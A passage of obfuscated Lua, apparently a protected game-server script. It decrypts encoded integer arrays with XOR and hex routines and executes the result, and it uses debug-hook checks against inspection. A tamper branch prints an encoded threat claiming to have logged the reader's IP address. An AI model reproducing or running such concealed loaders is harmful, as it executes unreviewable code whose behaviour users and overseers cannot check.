  122, 243, 51, 55, 58, 59, 99, 144, 239, 14, 42, 66, 197, 18, 32, 99, 88, 97, 111, 67, 241, 57, 29, 73, 73, 104, 54,
  113, 14, 88, 82, 118, 22, 8, 26, 127, 43, 134, 169, 56, 73, 49, 13, 24, 78, 78, 119, 80, 122, 43, 67, 48, 115, 53, 4,
  85, 100, 101, 15, 148, 1, 204, 0, 65, 85, 21, 17, 161, 65, 13, 61, 99, 12, 42, 66, 102, 101, 32, 58, 76, 2, 2, 80, 122,
  18, 100, 80, 16, 80, 66, 17, 55, 22, 59, 71, 254, 11, 46, 70, 19, 90, 17, 40, 101, 85, 86, 22, 32, 242, 250, 112, 35,
  121, 55, 70, 151, 116, 84, 69, 51, 73, 244, 112, 73, 2, 71, 98, 82, 190, 105, 232, 5, 92, 105, 30, 33, 12, 72, 25, 62,
  14, 17, 42, 55, 28, 9, 93, 63, 99, 24, 101, 86, 64, 25, 21, 80, 93, 97, 121, 36, 67, 3, 28, 69, 3, 170, 122, 58, 84,
  17, 238, 101, 118, 106, 50, 36, 8, 60, 19, 4, 14, 150, 4, 31, 28, 31, 18, 114, 119, 121, 67, 44, 16, 48, 60, 29, 30,
  50, 72, 44, 43, 70, 47, 168, 116, 73, 119, 49, 20, 80, 89, 33, 12, 105, 46, 189, 6, 43, 10, 129, 38, 62, 67, 68, 8, 33,
  33, 229, 92, 47, 80, 92, 52 }, "b0ESvup1iAptCcbaOYiWgVAYZV"); tYMHkmIeue7NbTqrO6Hkqzakvv26Se3YKu7sBVZHyqIisaCu4tlE =
afYBhSK5rlsC1GOXi66SlbKYjf7QdhVmXWNQLPnuzZmz7i2vjBCl9PGJTTH3nWiqM5C; nNIMewIoq5bo9p9LwePeQspcTXZoUL9zPraZKpcXLKeun0spE4PIKNOfJ3IzLOjhxmqZCJYZH =
afYBhSK5rlsC1GOXi66SlbKYjf7QdhVmXWNQLPnuzZmz7i2vjBCl9PGJTTH3nWiqM5C; jl7FfTd6e9Lc3DSOr7En40O6bO1uxoPzzomgeblL3dS53IAu4gg =
nNIMewIoq5bo9p9LwePeQspcTXZoUL9zPraZKpcXLKeun0spE4PIKNOfJ3IzLOjhxmqZCJYZH; iMI1MKDTIilUOj3cKQnjWxLUp1bAqZwxBRp6SQxbE4ycuJTh1H35vMpsmamyTns =
jl7FfTd6e9Lc3DSOr7En40O6bO1uxoPzzomgeblL3dS53IAu4gg; wnJKPxee0ZYO4TuZnriAzrLFr7GlgLB37emwhyI9r585l62Z0FiMJMM57v =
iMI1MKDTIilUOj3cKQnjWxLUp1bAqZwxBRp6SQxbE4ycuJTh1H35vMpsmamyTns; kiRJ38aDaSLr806egRWYm9ydIpZKGQpqnFN6Fi1mUqBL6H4uzGaRdGDcmuZQcMvSwt66oGm =
wnJKPxee0ZYO4TuZnriAzrLFr7GlgLB37emwhyI9r585l62Z0FiMJMM57v; xeH4WROv7puEVbjNk36tBoaLfOups4MRUKi6AIi6BbxSZ4hZveDAc2WXUYWFvo =
kiRJ38aDaSLr806egRWYm9ydIpZKGQpqnFN6Fi1mUqBL6H4uzGaRdGDcmuZQcMvSwt66oGm; bQ2GK2Gxg4at28I2zssDdFF0rnh9si09nUbDiRhNeTrSCJ9i2M8OojCpyTEbYXCKX2JArXfaGz =
xeH4WROv7puEVbjNk36tBoaLfOups4MRUKi6AIi6BbxSZ4hZveDAc2WXUYWFvo; aviJP7KmbAzHefuL2vLleZSxtmZFD7SHBUNKUxPK7PAmGlL4FoVFJVhkZ0mIBXvulZ8ME4T3WX =
bQ2GK2Gxg4at28I2zssDdFF0rnh9si09nUbDiRhNeTrSCJ9i2M8OojCpyTEbYXCKX2JArXfaGz; kVmnt5rWP0DTLOBMv2Dcab2K2oTGBuvMg7W7go76joQY0CG3GI1XLulKxirHAvaC5HISKR =
aviJP7KmbAzHefuL2vLleZSxtmZFD7SHBUNKUxPK7PAmGlL4FoVFJVhkZ0mIBXvulZ8ME4T3WX; uZKtwiaSbeSPBT1C5Un8UMZdF0xlpZOZ6BjhfJWzwWRnh8c7VFbsrYRoT3ggQDiCFkUv7hf2 =
kVmnt5rWP0DTLOBMv2Dcab2K2oTGBuvMg7W7go76joQY0CG3GI1XLulKxirHAvaC5HISKR; eGPrHcji8v4JRnmx4MPYwS9ZYaNZKg5xBTKbW1II2HMtTaMIdV3W5uB79hSJjDkQr0E =
uZKtwiaSbeSPBT1C5Un8UMZdF0xlpZOZ6BjhfJWzwWRnh8c7VFbsrYRoT3ggQDiCFkUv7hf2; wsz8RYH1973vewoCyUJ1FNvD4wjmXbLZFzKWtC6jkrvIAd2SabXgPPqw =
eGPrHcji8v4JRnmx4MPYwS9ZYaNZKg5xBTKbW1II2HMtTaMIdV3W5uB79hSJjDkQr0E; aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5 = function(
  a)
  K, F = 7804522429686436, 16384 + 4969; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; cRlN5pvkp8vKXf8k56ITB0hsdBMYXMQ38A5unyNJT5r0lTtLE3Rj = function(b)
  co = coroutine.create(b)
  cscMXdoNoqYlavgSPpxQ1ptxAqBjQlhwLCA0d0bPqVqRmIshDmTliV = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(cscMXdoNoqYlavgSPpxQ1ptxAqBjQlhwLCA0d0bPqVqRmIshDmTliV, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return cscMXdoNoqYlavgSPpxQ1ptxAqBjQlhwLCA0d0bPqVqRmIshDmTliV
end; tsBgNdnRq8ha99XOQc51kpgJnhvFRJp0rLQmshzx5ghN0e8ehVqPZBVQumnZi91UO2G = function(f, g)
  wNfL8MZ0HzEUmCwQcIp4km3dgmM9XoNxYB2O4jEUSJ771MxuNzomSpDSvVfvony = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; cNJQBwKjyJuvwcVgs7tMUImoTxoevaKRW824E2Qk8nqXsRo92MRUftpcr = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; fwdtb5Sc47DN4VRyMQZwdP6CrnFnMknOZTyqnbUCHjnTreZSKqXpSDjs = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      wNfL8MZ0HzEUmCwQcIp4km3dgmM9XoNxYB2O4jEUSJ771MxuNzomSpDSvVfvony(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; cyiv7nEf4whjGtqkcCuUXWPfhTYhbYtJXZXETUZB1TuI4ODiVSw4tUKG3wNy8DRLqHrhrhos = function(p, n)
    vMzTdSFupccWqFRzpgio9xK4cgSXBmic4SL4DlH06b08AKxjMvLSd = ""
    for k, q in pairs(p) do vMzTdSFupccWqFRzpgio9xK4cgSXBmic4SL4DlH06b08AKxjMvLSd =
      vMzTdSFupccWqFRzpgio9xK4cgSXBmic4SL4DlH06b08AKxjMvLSd ..
      wsz8RYH1973vewoCyUJ1FNvD4wjmXbLZFzKWtC6jkrvIAd2SabXgPPqw
      [aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('26') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('57') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('F5') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('3C') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('31') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('DA')]
      [aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('16') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('0B') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('B4') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('F5')](
      q) end
    ; n(vMzTdSFupccWqFRzpgio9xK4cgSXBmic4SL4DlH06b08AKxjMvLSd)
  end; cNJQBwKjyJuvwcVgs7tMUImoTxoevaKRW824E2Qk8nqXsRo92MRUftpcr(f,
    function(r) fwdtb5Sc47DN4VRyMQZwdP6CrnFnMknOZTyqnbUCHjnTreZSKqXpSDjs(r, g,
        function(s) cyiv7nEf4whjGtqkcCuUXWPfhTYhbYtJXZXETUZB1TuI4ODiVSw4tUKG3wNy8DRLqHrhrhos(s,
            function(t) if #cRlN5pvkp8vKXf8k56ITB0hsdBMYXMQ38A5unyNJT5r0lTtLE3Rj(wsz8RYH1973vewoCyUJ1FNvD4wjmXbLZFzKWtC6jkrvIAd2SabXgPPqw[aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('CF') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('62') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('B4') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('47')]) == 1 then if wsz8RYH1973vewoCyUJ1FNvD4wjmXbLZFzKWtC6jkrvIAd2SabXgPPqw[aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('CF') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('62') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('B4') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('47')] == wsz8RYH1973vewoCyUJ1FNvD4wjmXbLZFzKWtC6jkrvIAd2SabXgPPqw[aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('93') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('F5') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('3C') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('31') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('57')] then
                  print(
                  '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') else if wsz8RYH1973vewoCyUJ1FNvD4wjmXbLZFzKWtC6jkrvIAd2SabXgPPqw[aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('CF') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('62') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('B4') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('47')](t) then
                    wsz8RYH1973vewoCyUJ1FNvD4wjmXbLZFzKWtC6jkrvIAd2SabXgPPqw
                        [aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('CF') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('62') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('B4') .. aCQjGnr0JcUdrrS8b53PCzz7PRBkDJqGXY2mVwzDzV5IIUIQpsEF5('47')](
                        t)() end end else print(
                '\10\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10\10\94\49\68\111\110\39\116\32\116\114\121\32\116\111\32\112\114\105\110\116\32\116\104\101\32\99\111\100\101\32\115\99\117\109\98\97\103\46\10\10\73\116\39\115\32\105\108\108\101\103\97\108\32\116\111\32\114\101\108\101\97\115\101\32\116\104\105\115\32\115\99\114\105\112\116\46\32\89\111\117\39\114\101\32\98\114\101\97\107\105\110\103\32\116\104\101\32\99\111\112\121\114\105\103\104\116\32\108\97\119\46\32\10\10\79\104\44\32\98\116\119\44\32\73\39\118\101\32\108\111\103\103\101\100\32\121\111\117\114\32\73\80\32\97\100\100\114\101\115\115\46\10\10\94\48\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\45\10') end end) end) end)
end; tsBgNdnRq8ha99XOQc51kpgJnhvFRJp0rLQmshzx5ghN0e8ehVqPZBVQumnZi91UO2G(
{ 552, 981, 992, 770, 547, 824, 582, 845, 729, 663, 631, 842, 1069, 584, 869, 860, 559, 929, 553, 646, 686, 849, 599,
  1188, 830, 611, 898, 850, 808, 837, 616, 748, 935, 1066, 543, 1068, 1161, 967, 798, 678, 644, 1045, 662, 1058, 1199,
  681, 746, 773, 1118, 1193, 1160, 756, 880, 1034, 1102, 1090, 590, 873, 801, 1204, 719, 1190, 807, 544, 778, 803, 1085,
  1181, 649, 617, 867, 1166, 946, 871, 740, 777, 859, 638, 760, 955, 841, 858, 1099, 1046, 1208, 565, 979, 722, 775, 593,
  1029, 675, 724, 1179, 936, 717, 1104, 657, 647, 919, 1097, 655, 832, 827, 764, 1191, 626, 1101, 572, 1111, 705, 950,
  735, 1024, 855, 1121, 1144, 1055, 943, 1137, 654, 1056, 562, 570, 723, 709, 905, 999, 835, 668, 861, 699, 848, 578,
  1148, 1139, 1187, 635, 780, 791, 1073, 573, 695, 683, 731, 749, 690, 885, 623, 567, 902, 669, 704, 847, 772, 594, 1175,
  1051, 897, 1082, 866, 918, 1149, 868, 843, 673, 879, 928, 639, 667, 985, 903, 568, 758, 680, 1127, 958, 909, 726, 1072,
  922, 814, 651, 968, 757, 963, 1003, 1037, 1089, 1048, 876, 785, 863, 1185, 977, 1047, 1164, 687, 1132, 900, 1200, 733,
  1147, 715, 834, 692, 829, 1096, 1050, 636, 802, 710, 952, 656, 545, 941, 664, 1123, 1155, 1152, 1098, 550, 990, 630,
  1202, 1041, 939, 996, 587, 1143, 1018, 1094, 953, 1025, 653, 931, 1036, 853, 739, 652, 1106, 666, 1120, 1079, 1059,
  566, 661, 933, 844, 1013, 613, 640, 962, 1124, 857, 991, 886, 1087, 1170, 1016, 1054, 789, 949, 781, 606, 1033, 716,
  1116, 1135, 805, 1154, 1035, 971, 1021, 786, 734, 718, 947, 642, 854, 852, 1092, 1136, 1103, 689, 1209, 627, 1113, 581,
  612, 874, 1115, 682, 1086, 812, 1117, 591, 615, 969, 819, 932, 548, 1151, 1088, 973, 940, 670, 622, 957, 942, 1194,
  809, 1011, 1044, 1167, 1019, 913, 1169, 956, 761, 839, 1145, 793, 1031, 767, 706, 783, 609, 889, 836, 893, 1083, 688,
  697, 741, 883, 1128, 1075, 1150, 944, 924, 954, 1057, 1119, 604, 595, 1080, 1156, 864, 972, 901, 892, 796, 755, 828,
  603, 994, 937, 600, 912, 794, 965, 806, 1163, 601, 826, 911, 779, 974, 1052, 1015, 711, 1093, 679, 712, 1065, 925, 588,
  671, 998, 1077, 1189, 870, 753, 720, 650, 856, 1005, 728, 560, 608, 1141, 1210, 887, 934, 825, 571, 851, 1140, 1023,
  1197, 771, 1008, 1014, 1130, 1027, 1134, 976, 790, 1211, 800, 987, 1064, 877, 776, 988, 625, 1146, 966, 890, 1108,
  1042, 714, 1084, 1131, 799, 607, 862, 576, 1010, 1159, 569, 1038, 1100, 1076, 1172, 822, 619, 1186, 914, 872, 1183,
  742, 629, 1168, 815, 1176, 927, 945, 1177, 817, 549, 747, 840, 1162, 787, 1182, 948, 592, 763, 1184, 865, 700, 1133,
  1032, 754, 677, 721, 762, 926, 1020, 1012, 818, 1112, 684, 1071, 751, 1091, 713, 1206, 1173, 1203, 561, 891, 1109, 732,
  960, 916, 1074, 846, 693, 1081, 563, 551, 923, 665, 1017, 660, 895, 982, 621, 1095, 546, 633, 1158, 811, 585, 614, 632,
  1122, 618, 961, 1114, 821, 645, 766, 1049, 634, 904, 1061, 774, 884, 1006, 589, 1205, 970, 878, 782, 959, 557, 804,
  586, 1002, 1180, 1153, 993, 556, 769, 978, 1030, 1039, 1063, -1, 66, 122, 121, 66, 46, 25, 120, 72, 107, 102, 107, 187,
  75, 85, 17, 176, 23, 46, 23, 99, 69, 224, 30, 50, 49, 75, 3, 109, 37, 104, 52, 156, 177, 76, 176, 74, 87, 105, 102, 57,
  0, 39, 76, 14, 20, 98, 93, 58, 82, 23, 54, 108, 24, 176, 2, 251, 31, 70, 8, 32, 71, 107, 115, 102, 82, 24, 69, 171, 63,
  81, 93, 98, 44, 61, 4, 19, 36, 192, 107, 41, 99, 202, 3, 48, 4, 171, 79, 76, 6, 91, 118, 94, 76, 70, 40, 108, 75, 72,
  29, 46, 0, 23, 9, 119, 22, 237, 82, 40, 75, 30, 24, 82, 87, 94, 109, 148, 184, 86, 24, 82, 34, 31, 65, 9, 110, 65, 118,
  9, 23, 57, 113, 49, 98, 216, 17, 98, 118, 108, 98, 105, 50, 107, 59, 70, 75, 70, 75, 0, 128, 80, 74, 237, 76, 78, 103,
  126, 7, 20, 221, 115, 186, 94, 57, 48, 104, 20, 77, 31, 102, 82, 82, 107, 96, 36, 75, 27, 11, 0, 46, 37, 79, 10, 28,
  82, 44, 9, 42, 207, 86, 9, 114, 10, 7, 140, 7, 9, 45, 77, 74, 66, 65, 39, 216, 65, 17, 29, 5, 216, 66, 68, 106, 14, 76,
  50, 96, 85, 117, 28, 76, 68, 19, 76, 225, 35, 9, 194, 78, 74, 46, 73, 43, 76, 23, 69, 91, 24, 5, 20, 95, 76, 68, 153,
  113, 82, 48, 10, 8, 35, 118, 182, 19, 74, 200, 23, 251, 102, 118, 68, 40, 117, 42, 55, 37, 6, 21, 55, 57, 13, 122, 76,
  122, 103, 75, 89, 5, 104, 98, 178, 41, 70, 158, 0, 6, 4, 36, 82, 87, 6, 208, 11, 23, 70, 1, 71, 16, 106, 10, 50, 35,
  42, 78, 71, 1, 103, 80, 54, 33, 14, 76, 73, 106, 57, 1, 24, 10, 24, 69, 25, 102, 122, 94, 28, 47, 111, 36, 75, 70, 107,
  120, 0, 14, 44, 114, 87, 94, 103, 65, 76, 188, 193, 87, 65, 20, 25, 74, 60, 120, 24, 76, 98, 107, 56, 44, 0, 126, 5,
  105, 64, 76, 65, 93, 111, 15, 120, 102, 104, 116, 127, 121, 103, 48, 19, 128, 64, 170, 90, 43, 164, 111, 66, 76, 45,
  76, 72, 29, 110, 20, 232, 21, 81, 54, 104, 39, 85, 106, 106, 27, 35, 75, 18, 71, 65, 34, 3, 11, 0, 55, 9, 17, 123, 8,
  93, 13, 103, 66, 65, 69, 47, 3, 45, 31, 91, 87, 121, 115, 83, 64, 11, 25, 80, 63, 104, 247, 4, 94, 65, 7, 155, 49, 101,
  63, 222, 16, 219, 105, 47, 100, 23, 34, 60, 75, 107, 253, 47, 221, 76, 25, 168, 251, 75, 100, 46, 87, 121, 59, 86, 80,
  98, 64, 50, 86, 37, 108, 62, 60, 5, 93, 112, 48, 186, 51, 118, 3, 126, 13, 206, 0, 47, 62, 8, 12, 20, 57, 41, 72, 22,
  8, 218, 71, 79, 10, 65, 76, 0, 113, 84, 15, 84, 84, 72, 66, 30, 43, 90, 48, 4, 80, 134, 107, 185, 35, 72, 122, 64, 227,
  53, 62, 5, 76, 70, 27, 70, 34, 107, 82, 61, 126, 10, 87, 20, 106, 76, 94, 76, 18, 4, 120, 91, 118, 32, 66, 5, 76, 120,
  16, 3, 38, 2, 94, 121, 3, 107, 121, 62, 5, 104, 23, 238, 9, 79, 17, 99, 82, 1, 120, 5, 27, 17, 57, 3, 127, 35, 45, 105,
  102, 69, 64, 90, 66, 94, 125, 6, 77, 15, 24, 109, 4, 22, 21, 159, 33, 30, 51, 107, 84, 104, 125, 10, 28, 62, 23, 23,
  82, 51, 5, 82, 84, 69, 16, 13, 36, 15, 28, 46, 45, 121, 27, 6, 107, 119, 76, 132, 94, 60, 2, 200, 68, 110, 31, 31, 107,
  63, 125, 5, 103, 25, 71, 56, 6, 192, 27, 23, 35, 161, 10, 34, 41, 122, 88, 82, 98, 7, 38, 122, 63, 107, 59, 60, 98 },
  "laY8HoKlbVrZlB7lrgKJfGjweK"); y6pclMfvtwgz2P3chYt93oAtS67w23a7XHr1FsRcNnladUDVjecwX9iN0f0XQcuNfYv =
wsz8RYH1973vewoCyUJ1FNvD4wjmXbLZFzKWtC6jkrvIAd2SabXgPPqw; x7PcoXKDurToSbnEW2U6d51sLxPsdRsaEvi8U2I79s7EkrjOHdMALd9npKQEshhN8GOgP0rYGR =
wsz8RYH1973vewoCyUJ1FNvD4wjmXbLZFzKWtC6jkrvIAd2SabXgPPqw; y7Q8o0lN3fhGizpLV3gStTf8VLM3cQk2WhwaDnFUbmpmXxeAK4KbnejMcdG94HmeEBBEDUQH =
x7PcoXKDurToSbnEW2U6d51sLxPsdRsaEvi8U2I79s7EkrjOHdMALd9npKQEshhN8GOgP0rYGR; i28GvcswWdbqSmrW1A16kT3PnmeV40uGx1Osw7bBEp6tjcY4Uwetdk6p =
y7Q8o0lN3fhGizpLV3gStTf8VLM3cQk2WhwaDnFUbmpmXxeAK4KbnejMcdG94HmeEBBEDUQH; uYhG3GOK7JlzlE9oCWHcekTZ8xw1ma3i8xsjtbJQzm6WvGrem8IvuCMNU3QerON =
i28GvcswWdbqSmrW1A16kT3PnmeV40uGx1Osw7bBEp6tjcY4Uwetdk6p; oVKBa6UfMHuDUuFx0uWTqn9bKxVdkM8lyZCYoabOlWwG9pQlBBi7s =
uYhG3GOK7JlzlE9oCWHcekTZ8xw1ma3i8xsjtbJQzm6WvGrem8IvuCMNU3QerON; t7fZLO1oIKI0P0EbR7yCOFSfaWHnb4l6EdImCwzGJNSVeoezXoBl =
oVKBa6UfMHuDUuFx0uWTqn9bKxVdkM8lyZCYoabOlWwG9pQlBBi7s; lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah = function(
  a)
  K, F = 7038602050196984, 16384 + 7594; return a:gsub('%x%x',
    function(c)
      L = K % 274877906944; H = (K - L) / 274877906944; M = H % 128; c = tonumber(c, 16)
      m = (c + (H - M) / 128) * (2 * M + 1) % 256; K = L * F + H + c + m; return string.char(m)
    end)
end; wZC7O61qSVC8vNQ0EmGNceiR4PYulaaDRA8l6XhC4v3hnZtbkPo9laAd = function(b)
  co = coroutine.create(b)
  txSJSnxWNG6zzip2TH89mc7Gv5GQLRNVSxph2mJVY4Y9hVZI6zyvT = {}
  debug.sethook(co,
    function(d, e)
      i, k, v = 1, debug.getlocal(co, 2, 1)
      while k do
        table.insert(txSJSnxWNG6zzip2TH89mc7Gv5GQLRNVSxph2mJVY4Y9hVZI6zyvT, k)
        i = i + 1; k, v = debug.getlocal(co, 2, i)
      end
      ; coroutine.yield()
    end, "c")
  res = coroutine.resume(co)
  return txSJSnxWNG6zzip2TH89mc7Gv5GQLRNVSxph2mJVY4Y9hVZI6zyvT
end; jwPkZaZbEgI0jtQP6kH5t0T9dSjK7lXlNLvYa8u0WJHi1kmMvFTpkk9tiRSlLcpRvf4tjuGr = function(f, g)
  gCEwKACOGZy4ZnR5ZI0NGCqRcNNDe6CBYAS7k3ArCwnL5qTWeLtLEH2ZA = function(h, l, n)
    XOR_l = { { 0, 1 }, { 1, 0 } }
    pow = 1; c = 0; while h > 0 or l > 0 do
      c = c + XOR_l[h % 2 + 1][l % 2 + 1] * pow; h = math.floor(h / 2)
      l = math.floor(l / 2)
      pow = pow * 2
    end
    ; n(c)
  end; iZ0lDmdkPPU64wWzWicIkEcH02HOApmIa2bdxZrWF4ry5LLSeIUOXolhoXh = function(f, n)
    result = {}
    i = 1; index = f[i]
    while index >= 0 do
      result[i] = f[index + 1]
      i = i + 1; index = f[i]
    end
    ; n(result)
  end; xXueInGpemfuftTM6jsBIirJicA0UczR3X350zMJWbXNRB5f1LdK3Mthj2pa = function(f, g, n)
    if #g <= 0 then return {} end
    ; i = 1; j = 1; for i = 1, #f do
      gCEwKACOGZy4ZnR5ZI0NGCqRcNNDe6CBYAS7k3ArCwnL5qTWeLtLEH2ZA(f[i], string.byte(g, j), function(o) f[i] = o end)
      j = j + 1; if j > #g then j = 1 end
    end
    ; n(f)
  end; uLLSq8s8iUcaBO0y3HCrX8vjEw4ulnBVwtWpwe8QZrxCz6zxGSBJfLeUOPDBiWba = function(p, n)
    bLJum82LJinwb3G3OgfAX0Zt72DKEKt73EAkkroUTKqmePde5S6TZH6s876S35PAFMqpeSwu9 = ""
    for k, q in pairs(p) do bLJum82LJinwb3G3OgfAX0Zt72DKEKt73EAkkroUTKqmePde5S6TZH6s876S35PAFMqpeSwu9 =
      bLJum82LJinwb3G3OgfAX0Zt72DKEKt73EAkkroUTKqmePde5S6TZH6s876S35PAFMqpeSwu9 ..
      t7fZLO1oIKI0P0EbR7yCOFSfaWHnb4l6EdImCwzGJNSVeoezXoBl
      [lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('B7') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('7C') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('F2') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('05') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('DE') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('7B')]
      [lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('67') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('40') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('DD') .. lUdPm10v3qR5gGVZQqlrFwaspIEpWpas8l6YFir8WF2pRB2CUYoZXAwNuIJt8qKLMah('F2')](
      q) end
    ; n(bLJum82LJinwb3G3OgfAX0Zt72DKEKt73EAkkroUTKqmePde5S6TZH6s876S35PAFMqpeSwu9)
  end; iZ0lDmdkPPU64wWzWicIkEcH02HOApmIa2bdxZrWF4ry5LLSeIUOXolhoXh(f,
    function(r) xXueInGpemfuftTM6jsBIirJicA0UczR3X350zMJWbXNRB5f1LdK3Mthj2pa(r, g,
